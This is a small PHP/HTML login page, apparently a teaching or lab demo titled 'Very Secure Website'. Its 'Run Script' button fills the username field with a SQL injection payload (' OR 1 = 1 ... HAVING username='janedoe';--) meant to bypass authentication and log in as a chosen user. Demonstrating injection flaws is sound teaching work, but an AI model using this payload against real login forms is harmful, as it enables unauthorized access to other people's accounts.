<?php
  session_start();
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Very Secure Website</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="style.css">
  </head>
  <body class="login">
    <form action="action_login.php" method="post">
      <input type="text" name="username" placeholder="username">
      <input type="password" name="password" placeholder="password">
      <button type="submit">Login</button>
      <button type="submit" id="sqli">Run Script</button>
    </form>
      <script>
        document.querySelector('.login button[type="submit"]#sqli').addEventListener('click', function(e) {
            e.preventDefault();
            const usernameCell = document.querySelector('.login input[name="username"]');
            const passwordCell = document.querySelector('.login input[name="password"]');

            usernameCell.value = "' OR 1 = 1 GROUP BY username HAVING username='janedoe';--";

            // Doesn't matter, just in case it was required
            passwordCell.value = '123';
        });
      </script>
  </body>
</html>

